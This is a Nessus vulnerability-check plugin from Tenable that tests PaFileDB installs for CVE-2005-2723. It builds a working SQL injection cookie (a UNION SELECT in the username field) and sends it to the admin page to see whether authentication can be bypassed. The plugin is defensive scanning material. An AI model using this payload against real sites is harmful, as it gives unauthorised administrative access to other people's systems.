#
# (C) Tenable Network Security
#


if (description) {
  script_id(19505);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2723");
  script_bugtraq_id(14654);

  script_name(english:"PaFileDB pafiledbcookie SQL Injection Vulnerability");
  script_summary(english:"Checks for pafiledbcookie SQL injection vulnerability in PaFileDB");
 
  desc = "
Synopsis :

The remote web server contains a PHP script that is susceptible to SQL
injection attacks. 

Description :

The remote version of PaFileDB suffers from a flaw by which an
attacker can gain access to the application's administrative control
panel by means of a SQL injection attack via a specially-crafted
cookie. 

See also : 

http://www.security-project.org/projects/board/showthread.php?t=947

Solution : 

Edit '$authmethod' in 'pafiledb.php' to disable cookie-based
authentication. 

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("pafiledb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/pafiledb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit the flaw.
  user = rand_str();
  passwd = SCRIPT_NAME;
  # nb: the exploit is composed of three fields joined by "|":
  #     1) MD5-encoded ip address of the attacking host
  #        (so if you're NAT'd, this won't work!)
  #     2) username along with the SQL injection.
  #     3) the password string
  exploit = string(
    hexstr(MD5(this_host())), "|", 
    user, "' UNION SELECT 1,2,'", passwd, "',4,5/*", "|",
    passwd
  );
  req = http_get(item:string(dir, "/pafiledb.php?action=admin"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: pafiledbcookie=", urlencode(str:exploit), "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like we logged in.
  if (egrep(string:res, pattern:string(user, "' UNION SELECT.+pafiledb.php?action=admin&ad=logout"))) {
    security_warning(port);
    exit(0);
  }
}
